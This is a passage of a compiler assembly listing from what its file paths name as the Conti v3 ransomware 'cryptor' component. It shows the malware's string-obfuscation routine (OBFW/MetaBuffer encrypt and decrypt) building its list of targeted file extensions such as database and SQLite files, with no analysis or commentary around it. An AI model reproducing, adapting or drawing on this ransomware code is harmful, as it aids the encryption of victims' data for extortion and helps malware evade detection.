  03358	c6 85 80 05 00
	00 00		 mov	 BYTE PTR $T128[rbp-256], 0
  0335f	c6 85 81 05 00
	00 12		 mov	 BYTE PTR $T128[rbp-255], 18
  03366	c6 85 82 05 00
	00 78		 mov	 BYTE PTR $T128[rbp-254], 120 ; 00000078H
  0336d	c6 85 83 05 00
	00 77		 mov	 BYTE PTR $T128[rbp-253], 119 ; 00000077H
  03374	c6 85 84 05 00
	00 78		 mov	 BYTE PTR $T128[rbp-252], 120 ; 00000078H
  0337b	c6 85 85 05 00
	00 21		 mov	 BYTE PTR $T128[rbp-251], 33 ; 00000021H
  03382	c6 85 86 05 00
	00 78		 mov	 BYTE PTR $T128[rbp-250], 120 ; 00000078H
  03389	c6 85 87 05 00
	00 03		 mov	 BYTE PTR $T128[rbp-249], 3
  03390	c6 85 88 05 00
	00 78		 mov	 BYTE PTR $T128[rbp-248], 120 ; 00000078H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  03397	c6 85 89 05 00
	00 78		 mov	 BYTE PTR $T128[rbp-247], 120 ; 00000078H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 421  : 		OBFW(L".scx"),

  0339e	48 8d 8d 80 05
	00 00		 lea	 rcx, QWORD PTR $T128[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  033a5	c6 85 8a 05 00
	00 78		 mov	 BYTE PTR $T128[rbp-246], 120 ; 00000078H
  033ac	0f b6 85 81 05
	00 00		 movzx	 eax, BYTE PTR $T128[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 421  : 		OBFW(L".scx"),

  033b3	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<53,120,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  033b8	48 89 85 28 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+760], rax

; 422  : 		OBFW(L".sdb"),

  033bf	48 8d 8d 90 05
	00 00		 lea	 rcx, QWORD PTR $T129[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  033c6	c6 85 90 05 00
	00 00		 mov	 BYTE PTR $T129[rbp-256], 0
  033cd	c6 85 91 05 00
	00 0b		 mov	 BYTE PTR $T129[rbp-255], 11
  033d4	c6 85 92 05 00
	00 03		 mov	 BYTE PTR $T129[rbp-254], 3
  033db	c6 85 93 05 00
	00 17		 mov	 BYTE PTR $T129[rbp-253], 23
  033e2	c6 85 94 05 00
	00 03		 mov	 BYTE PTR $T129[rbp-252], 3
  033e9	c6 85 95 05 00
	00 30		 mov	 BYTE PTR $T129[rbp-251], 48 ; 00000030H
  033f0	c6 85 96 05 00
	00 03		 mov	 BYTE PTR $T129[rbp-250], 3
  033f7	c6 85 97 05 00
	00 09		 mov	 BYTE PTR $T129[rbp-249], 9
  033fe	c6 85 98 05 00
	00 03		 mov	 BYTE PTR $T129[rbp-248], 3
  03405	c6 85 99 05 00
	00 03		 mov	 BYTE PTR $T129[rbp-247], 3
  0340c	c6 85 9a 05 00
	00 03		 mov	 BYTE PTR $T129[rbp-246], 3
  03413	0f b6 85 91 05
	00 00		 movzx	 eax, BYTE PTR $T129[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 422  : 		OBFW(L".sdb"),

  0341a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FD@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<83,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0341f	48 89 85 30 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+768], rax

; 423  : 		OBFW(L".sdc"),

  03426	48 8d 8d a0 05
	00 00		 lea	 rcx, QWORD PTR $T130[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0342d	c6 85 a0 05 00
	00 00		 mov	 BYTE PTR $T130[rbp-256], 0
  03434	c6 85 a1 05 00
	00 76		 mov	 BYTE PTR $T130[rbp-255], 118 ; 00000076H
  0343b	c6 85 a2 05 00
	00 28		 mov	 BYTE PTR $T130[rbp-254], 40 ; 00000028H
  03442	c6 85 a3 05 00
	00 6c		 mov	 BYTE PTR $T130[rbp-253], 108 ; 0000006cH
  03449	c6 85 a4 05 00
	00 28		 mov	 BYTE PTR $T130[rbp-252], 40 ; 00000028H
  03450	c6 85 a5 05 00
	00 42		 mov	 BYTE PTR $T130[rbp-251], 66 ; 00000042H
  03457	c6 85 a6 05 00
	00 28		 mov	 BYTE PTR $T130[rbp-250], 40 ; 00000028H
  0345e	c6 85 a7 05 00
	00 72		 mov	 BYTE PTR $T130[rbp-249], 114 ; 00000072H
  03465	c6 85 a8 05 00
	00 28		 mov	 BYTE PTR $T130[rbp-248], 40 ; 00000028H
  0346c	c6 85 a9 05 00
	00 28		 mov	 BYTE PTR $T130[rbp-247], 40 ; 00000028H
  03473	c6 85 aa 05 00
	00 28		 mov	 BYTE PTR $T130[rbp-246], 40 ; 00000028H
  0347a	0f b6 85 a1 05
	00 00		 movzx	 eax, BYTE PTR $T130[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 423  : 		OBFW(L".sdc"),

  03481	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0CI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<79,40,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03486	48 89 85 38 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+776], rax

; 424  : 		OBFW(L".sdf"),

  0348d	48 8d 8d b0 05
	00 00		 lea	 rcx, QWORD PTR $T131[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03494	c6 85 b0 05 00
	00 00		 mov	 BYTE PTR $T131[rbp-256], 0
  0349b	c6 85 b1 05 00
	00 37		 mov	 BYTE PTR $T131[rbp-255], 55 ; 00000037H
  034a2	c6 85 b2 05 00
	00 15		 mov	 BYTE PTR $T131[rbp-254], 21
  034a9	c6 85 b3 05 00
	00 6a		 mov	 BYTE PTR $T131[rbp-253], 106 ; 0000006aH
  034b0	c6 85 b4 05 00
	00 15		 mov	 BYTE PTR $T131[rbp-252], 21
  034b7	c6 85 b5 05 00
	00 75		 mov	 BYTE PTR $T131[rbp-251], 117 ; 00000075H
  034be	c6 85 b6 05 00
	00 15		 mov	 BYTE PTR $T131[rbp-250], 21
  034c5	c6 85 b7 05 00
	00 7c		 mov	 BYTE PTR $T131[rbp-249], 124 ; 0000007cH
  034cc	c6 85 b8 05 00
	00 15		 mov	 BYTE PTR $T131[rbp-248], 21
  034d3	c6 85 b9 05 00
	00 15		 mov	 BYTE PTR $T131[rbp-247], 21
  034da	c6 85 ba 05 00
	00 15		 mov	 BYTE PTR $T131[rbp-246], 21
  034e1	0f b6 85 b1 05
	00 00		 movzx	 eax, BYTE PTR $T131[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 424  : 		OBFW(L".sdf"),

  034e8	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<67,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  034ed	48 89 85 40 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+784], rax

; 425  : 		OBFW(L".sis"),

  034f4	48 8d 8d c0 05
	00 00		 lea	 rcx, QWORD PTR $T132[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  034fb	c6 85 c0 05 00
	00 00		 mov	 BYTE PTR $T132[rbp-256], 0
  03502	c6 85 c1 05 00
	00 63		 mov	 BYTE PTR $T132[rbp-255], 99 ; 00000063H
  03509	c6 85 c2 05 00
	00 72		 mov	 BYTE PTR $T132[rbp-254], 114 ; 00000072H
  03510	c6 85 c3 05 00
	00 0d		 mov	 BYTE PTR $T132[rbp-253], 13
  03517	c6 85 c4 05 00
	00 72		 mov	 BYTE PTR $T132[rbp-252], 114 ; 00000072H
  0351e	c6 85 c5 05 00
	00 4d		 mov	 BYTE PTR $T132[rbp-251], 77 ; 0000004dH
  03525	c6 85 c6 05 00
	00 72		 mov	 BYTE PTR $T132[rbp-250], 114 ; 00000072H
  0352c	c6 85 c7 05 00
	00 0d		 mov	 BYTE PTR $T132[rbp-249], 13
  03533	c6 85 c8 05 00
	00 72		 mov	 BYTE PTR $T132[rbp-248], 114 ; 00000072H
  0353a	c6 85 c9 05 00
	00 72		 mov	 BYTE PTR $T132[rbp-247], 114 ; 00000072H
  03541	c6 85 ca 05 00
	00 72		 mov	 BYTE PTR $T132[rbp-246], 114 ; 00000072H
  03548	0f b6 85 c1 05
	00 00		 movzx	 eax, BYTE PTR $T132[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 425  : 		OBFW(L".sis"),

  0354f	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BD@$0HC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<19,114,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03554	48 89 85 48 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+792], rax

; 426  : 		OBFW(L".spq"),

  0355b	48 8d 8d d0 05
	00 00		 lea	 rcx, QWORD PTR $T133[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03562	c6 85 d0 05 00
	00 00		 mov	 BYTE PTR $T133[rbp-256], 0
  03569	c6 85 d1 05 00
	00 7e		 mov	 BYTE PTR $T133[rbp-255], 126 ; 0000007eH
  03570	c6 85 d2 05 00
	00 6d		 mov	 BYTE PTR $T133[rbp-254], 109 ; 0000006dH
  03577	c6 85 d3 05 00
	00 58		 mov	 BYTE PTR $T133[rbp-253], 88 ; 00000058H
  0357e	c6 85 d4 05 00
	00 6d		 mov	 BYTE PTR $T133[rbp-252], 109 ; 0000006dH
  03585	c6 85 d5 05 00
	00 33		 mov	 BYTE PTR $T133[rbp-251], 51 ; 00000033H
  0358c	c6 85 d6 05 00
	00 6d		 mov	 BYTE PTR $T133[rbp-250], 109 ; 0000006dH
  03593	c6 85 d7 05 00
	00 15		 mov	 BYTE PTR $T133[rbp-249], 21
  0359a	c6 85 d8 05 00
	00 6d		 mov	 BYTE PTR $T133[rbp-248], 109 ; 0000006dH
  035a1	c6 85 d9 05 00
	00 6d		 mov	 BYTE PTR $T133[rbp-247], 109 ; 0000006dH
  035a8	c6 85 da 05 00
	00 6d		 mov	 BYTE PTR $T133[rbp-246], 109 ; 0000006dH
  035af	0f b6 85 d1 05
	00 00		 movzx	 eax, BYTE PTR $T133[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 426  : 		OBFW(L".spq"),

  035b6	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GB@$0GN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<97,109,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  035bb	48 89 85 50 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+800], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  035c2	c6 85 e0 05 00
	00 00		 mov	 BYTE PTR $T134[rbp-256], 0
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 427  : 		OBFW(L".sql"),

  035c9	48 8d 8d e0 05
	00 00		 lea	 rcx, QWORD PTR $T134[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  035d0	c6 85 e1 05 00
	00 74		 mov	 BYTE PTR $T134[rbp-255], 116 ; 00000074H
  035d7	c6 85 e2 05 00
	00 30		 mov	 BYTE PTR $T134[rbp-254], 48 ; 00000030H
  035de	c6 85 e3 05 00
	00 5b		 mov	 BYTE PTR $T134[rbp-253], 91 ; 0000005bH
  035e5	c6 85 e4 05 00
	00 30		 mov	 BYTE PTR $T134[rbp-252], 48 ; 00000030H
  035ec	c6 85 e5 05 00
	00 4d		 mov	 BYTE PTR $T134[rbp-251], 77 ; 0000004dH
  035f3	c6 85 e6 05 00
	00 30		 mov	 BYTE PTR $T134[rbp-250], 48 ; 00000030H
  035fa	c6 85 e7 05 00
	00 2a		 mov	 BYTE PTR $T134[rbp-249], 42 ; 0000002aH
  03601	c6 85 e8 05 00
	00 30		 mov	 BYTE PTR $T134[rbp-248], 48 ; 00000030H
  03608	c6 85 e9 05 00
	00 30		 mov	 BYTE PTR $T134[rbp-247], 48 ; 00000030H
  0360f	c6 85 ea 05 00
	00 30		 mov	 BYTE PTR $T134[rbp-246], 48 ; 00000030H
  03616	0f b6 85 e1 05
	00 00		 movzx	 eax, BYTE PTR $T134[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 427  : 		OBFW(L".sql"),

  0361d	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<7,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  03622	48 89 85 58 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+808], rax

; 428  : 		OBFW(L".sqlite"),

  03629	48 8d 8d 80 09
	00 00		 lea	 rcx, QWORD PTR $T135[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03630	c6 85 80 09 00
	00 00		 mov	 BYTE PTR $T135[rbp-256], 0
  03637	c6 85 81 09 00
	00 01		 mov	 BYTE PTR $T135[rbp-255], 1
  0363e	c6 85 82 09 00
	00 63		 mov	 BYTE PTR $T135[rbp-254], 99 ; 00000063H
  03645	c6 85 83 09 00
	00 6c		 mov	 BYTE PTR $T135[rbp-253], 108 ; 0000006cH
  0364c	c6 85 84 09 00
	00 63		 mov	 BYTE PTR $T135[rbp-252], 99 ; 00000063H
  03653	c6 85 85 09 00
	00 2e		 mov	 BYTE PTR $T135[rbp-251], 46 ; 0000002eH
  0365a	c6 85 86 09 00
	00 63		 mov	 BYTE PTR $T135[rbp-250], 99 ; 00000063H
  03661	c6 85 87 09 00
	00 12		 mov	 BYTE PTR $T135[rbp-249], 18
  03668	c6 85 88 09 00
	00 63		 mov	 BYTE PTR $T135[rbp-248], 99 ; 00000063H
  0366f	c6 85 89 09 00
	00 34		 mov	 BYTE PTR $T135[rbp-247], 52 ; 00000034H
  03676	c6 85 8a 09 00
	00 63		 mov	 BYTE PTR $T135[rbp-246], 99 ; 00000063H
  0367d	c6 85 8b 09 00
	00 0c		 mov	 BYTE PTR $T135[rbp-245], 12
  03684	c6 85 8c 09 00
	00 63		 mov	 BYTE PTR $T135[rbp-244], 99 ; 00000063H
  0368b	c6 85 8d 09 00
	00 37		 mov	 BYTE PTR $T135[rbp-243], 55 ; 00000037H
  03692	c6 85 8e 09 00
	00 63		 mov	 BYTE PTR $T135[rbp-242], 99 ; 00000063H
  03699	c6 85 8f 09 00
	00 63		 mov	 BYTE PTR $T135[rbp-241], 99 ; 00000063H
  036a0	c6 85 90 09 00
	00 63		 mov	 BYTE PTR $T135[rbp-240], 99 ; 00000063H
  036a7	0f b6 85 81 09
	00 00		 movzx	 eax, BYTE PTR $T135[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 428  : 		OBFW(L".sqlite"),

  036ae	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BP@$0GD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@@std@@@@QEAAPEBDXZ ; MetaBuffer<31,99,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15> >::decrypt
  036b3	48 89 85 60 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+816], rax

; 429  : 		OBFW(L".sqlite3"),

  036ba	48 8d 8d b0 09
	00 00		 lea	 rcx, QWORD PTR $T136[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  036c1	c6 85 b0 09 00
	00 00		 mov	 BYTE PTR $T136[rbp-256], 0
  036c8	c6 85 b1 09 00
	00 74		 mov	 BYTE PTR $T136[rbp-255], 116 ; 00000074H
  036cf	c6 85 b2 09 00
	00 34		 mov	 BYTE PTR $T136[rbp-254], 52 ; 00000034H
  036d6	c6 85 b3 09 00
	00 55		 mov	 BYTE PTR $T136[rbp-253], 85 ; 00000055H
  036dd	c6 85 b4 09 00
	00 34		 mov	 BYTE PTR $T136[rbp-252], 52 ; 00000034H
  036e4	c6 85 b5 09 00
	00 1b		 mov	 BYTE PTR $T136[rbp-251], 27
  036eb	c6 85 b6 09 00
	00 34		 mov	 BYTE PTR $T136[rbp-250], 52 ; 00000034H
  036f2	c6 85 b7 09 00
	00 09		 mov	 BYTE PTR $T136[rbp-249], 9
  036f9	c6 85 b8 09 00
	00 34		 mov	 BYTE PTR $T136[rbp-248], 52 ; 00000034H
  03700	c6 85 b9 09 00
	00 31		 mov	 BYTE PTR $T136[rbp-247], 49 ; 00000031H
  03707	c6 85 ba 09 00
	00 34		 mov	 BYTE PTR $T136[rbp-246], 52 ; 00000034H
  0370e	c6 85 bb 09 00
	00 72		 mov	 BYTE PTR $T136[rbp-245], 114 ; 00000072H
  03715	c6 85 bc 09 00
	00 34		 mov	 BYTE PTR $T136[rbp-244], 52 ; 00000034H
  0371c	c6 85 bd 09 00
	00 3c		 mov	 BYTE PTR $T136[rbp-243], 60 ; 0000003cH
  03723	c6 85 be 09 00
	00 34		 mov	 BYTE PTR $T136[rbp-242], 52 ; 00000034H
  0372a	c6 85 bf 09 00
	00 07		 mov	 BYTE PTR $T136[rbp-241], 7
  03731	c6 85 c0 09 00
	00 34		 mov	 BYTE PTR $T136[rbp-240], 52 ; 00000034H
  03738	c6 85 c1 09 00
	00 34		 mov	 BYTE PTR $T136[rbp-239], 52 ; 00000034H
  0373f	c6 85 c2 09 00
	00 34		 mov	 BYTE PTR $T136[rbp-238], 52 ; 00000034H
  03746	0f b6 85 b1 09
	00 00		 movzx	 eax, BYTE PTR $T136[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 429  : 		OBFW(L".sqlite3"),

  0374d	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BN@$0DE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@@std@@@@QEAAPEBDXZ ; MetaBuffer<29,52,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17> >::decrypt
  03752	48 89 85 68 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+824], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03759	c6 85 f8 09 00
	00 00		 mov	 BYTE PTR $T137[rbp-256], 0
  03760	c6 85 f9 09 00
	00 5f		 mov	 BYTE PTR $T137[rbp-255], 95 ; 0000005fH
  03767	c6 85 fa 09 00
	00 4b		 mov	 BYTE PTR $T137[rbp-254], 75 ; 0000004bH
  0376e	c6 85 fb 09 00
	00 7d		 mov	 BYTE PTR $T137[rbp-253], 125 ; 0000007dH
  03775	c6 85 fc 09 00
	00 4b		 mov	 BYTE PTR $T137[rbp-252], 75 ; 0000004bH
  0377c	c6 85 fd 09 00
	00 5b		 mov	 BYTE PTR $T137[rbp-251], 91 ; 0000005bH
  03783	c6 85 fe 09 00
	00 4b		 mov	 BYTE PTR $T137[rbp-250], 75 ; 0000004bH
  0378a	c6 85 ff 09 00
	00 06		 mov	 BYTE PTR $T137[rbp-249], 6
  03791	c6 85 00 0a 00
	00 4b		 mov	 BYTE PTR $T137[rbp-248], 75 ; 0000004bH
  03798	c6 85 01 0a 00
	00 52		 mov	 BYTE PTR $T137[rbp-247], 82 ; 00000052H
  0379f	c6 85 02 0a 00
	00 4b		 mov	 BYTE PTR $T137[rbp-246], 75 ; 0000004bH
  037a6	c6 85 03 0a 00
	00 0f		 mov	 BYTE PTR $T137[rbp-245], 15
  037ad	c6 85 04 0a 00
	00 4b		 mov	 BYTE PTR $T137[rbp-244], 75 ; 0000004bH
  037b4	c6 85 05 0a 00
	00 0e		 mov	 BYTE PTR $T137[rbp-243], 14
  037bb	c6 85 06 0a 00
	00 4b		 mov	 BYTE PTR $T137[rbp-242], 75 ; 0000004bH
  037c2	c6 85 07 0a 00
	00 7c		 mov	 BYTE PTR $T137[rbp-241], 124 ; 0000007cH
  037c9	c6 85 08 0a 00
	00 4b		 mov	 BYTE PTR $T137[rbp-240], 75 ; 0000004bH
  037d0	c6 85 09 0a 00
	00 5a		 mov	 BYTE PTR $T137[rbp-239], 90 ; 0000005aH
  037d7	c6 85 0a 0a 00
	00 4b		 mov	 BYTE PTR $T137[rbp-238], 75 ; 0000004bH
  037de	c6 85 0b 0a 00
	00 4b		 mov	 BYTE PTR $T137[rbp-237], 75 ; 0000004bH
  037e5	c6 85 0c 0a 00
	00 4b		 mov	 BYTE PTR $T137[rbp-236], 75 ; 0000004bH
  037ec	0f b6 85 f9 09
	00 00		 movzx	 eax, BYTE PTR $T137[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 430  : 		OBFW(L".sqlitedb"),

  037f3	48 8d 8d f8 09
	00 00		 lea	 rcx, QWORD PTR $T137[rbp-256]
  037fa	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0EL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@@std@@@@QEAAPEBDXZ ; MetaBuffer<17,75,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19> >::decrypt
  037ff	48 89 85 70 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+832], rax

; 431  : 		OBFW(L".te"),

  03806	48 8d 4c 24 50	 lea	 rcx, QWORD PTR $T138[rsp]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0380b	c6 44 24 50 00	 mov	 BYTE PTR $T138[rsp], 0
  03810	c6 44 24 51 1f	 mov	 BYTE PTR $T138[rsp+1], 31
  03815	c6 44 24 52 54	 mov	 BYTE PTR $T138[rsp+2], 84 ; 00000054H
  0381a	c6 44 24 53 74	 mov	 BYTE PTR $T138[rsp+3], 116 ; 00000074H
  0381f	c6 44 24 54 54	 mov	 BYTE PTR $T138[rsp+4], 84 ; 00000054H
  03824	c6 44 24 55 7d	 mov	 BYTE PTR $T138[rsp+5], 125 ; 0000007dH
  03829	c6 44 24 56 54	 mov	 BYTE PTR $T138[rsp+6], 84 ; 00000054H
  0382e	c6 44 24 57 54	 mov	 BYTE PTR $T138[rsp+7], 84 ; 00000054H
  03833	c6 44 24 58 54	 mov	 BYTE PTR $T138[rsp+8], 84 ; 00000054H
  03838	0f b6 44 24 51	 movzx	 eax, BYTE PTR $T138[rsp+1]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 431  : 		OBFW(L".te"),

  0383d	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ ; MetaBuffer<101,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7> >::decrypt
  03842	48 89 85 78 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+840], rax

; 432  : 		OBFW(L".temx"),

  03849	48 8d 8d 40 08
	00 00		 lea	 rcx, QWORD PTR $T139[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  03850	c6 85 40 08 00
	00 00		 mov	 BYTE PTR $T139[rbp-256], 0
  03857	c6 85 41 08 00
	00 66		 mov	 BYTE PTR $T139[rbp-255], 102 ; 00000066H
  0385e	c6 85 42 08 00
	00 79		 mov	 BYTE PTR $T139[rbp-254], 121 ; 00000079H
  03865	c6 85 43 08 00
	00 33		 mov	 BYTE PTR $T139[rbp-253], 51 ; 00000033H
  0386c	c6 85 44 08 00
	00 79		 mov	 BYTE PTR $T139[rbp-252], 121 ; 00000079H
  03873	c6 85 45 08 00
	00 47		 mov	 BYTE PTR $T139[rbp-251], 71 ; 00000047H
  0387a	c6 85 46 08 00
	00 79		 mov	 BYTE PTR $T139[rbp-250], 121 ; 00000079H
  03881	c6 85 47 08 00
	00 12		 mov	 BYTE PTR $T139[rbp-249], 18
  03888	c6 85 48 08 00
	00 79		 mov	 BYTE PTR $T139[rbp-248], 121 ; 00000079H
  0388f	c6 85 49 08 00
	00 58		 mov	 BYTE PTR $T139[rbp-247], 88 ; 00000058H
  03896	c6 85 4a 08 00
	00 79		 mov	 BYTE PTR $T139[rbp-246], 121 ; 00000079H
  0389d	c6 85 4b 08 00
	00 79		 mov	 BYTE PTR $T139[rbp-245], 121 ; 00000079H
  038a4	c6 85 4c 08 00
	00 79		 mov	 BYTE PTR $T139[rbp-244], 121 ; 00000079H
  038ab	0f b6 85 41 08
	00 00		 movzx	 eax, BYTE PTR $T139[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 432  : 		OBFW(L".temx"),

  038b2	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$0HJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<41,121,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  038b7	48 89 85 80 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+848], rax

; 433  : 		OBFW(L".tmd"),

  038be	48 8d 8d f0 05
	00 00		 lea	 rcx, QWORD PTR $T140[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  038c5	c6 85 f0 05 00
	00 00		 mov	 BYTE PTR $T140[rbp-256], 0
  038cc	c6 85 f1 05 00
	00 35		 mov	 BYTE PTR $T140[rbp-255], 53 ; 00000035H
  038d3	c6 85 f2 05 00
	00 66		 mov	 BYTE PTR $T140[rbp-254], 102 ; 00000066H
  038da	c6 85 f3 05 00
	00 7a		 mov	 BYTE PTR $T140[rbp-253], 122 ; 0000007aH
  038e1	c6 85 f4 05 00
	00 66		 mov	 BYTE PTR $T140[rbp-252], 102 ; 00000066H
  038e8	c6 85 f5 05 00
	00 4d		 mov	 BYTE PTR $T140[rbp-251], 77 ; 0000004dH
  038ef	c6 85 f6 05 00
	00 66		 mov	 BYTE PTR $T140[rbp-250], 102 ; 00000066H
  038f6	c6 85 f7 05 00
	00 01		 mov	 BYTE PTR $T140[rbp-249], 1
  038fd	c6 85 f8 05 00
	00 66		 mov	 BYTE PTR $T140[rbp-248], 102 ; 00000066H
  03904	c6 85 f9 05 00
	00 66		 mov	 BYTE PTR $T140[rbp-247], 102 ; 00000066H
  0390b	c6 85 fa 05 00
	00 66		 mov	 BYTE PTR $T140[rbp-246], 102 ; 00000066H
  03912	0f b6 85 f1 05
	00 00		 movzx	 eax, BYTE PTR $T140[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 433  : 		OBFW(L".tmd"),

  03919	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<79,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0391e	48 89 85 88 0e
	00 00		 mov	 QWORD PTR Extensions$[rbp+856], rax

; 434  : 		OBFW(L".tps"),

  03925	48 8d 8d 00 06
	00 00		 lea	 rcx, QWORD PTR $T141[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0392c	c6 85 00 06 00
	00 00		 mov	 BYTE PTR $T141[rbp-256], 0
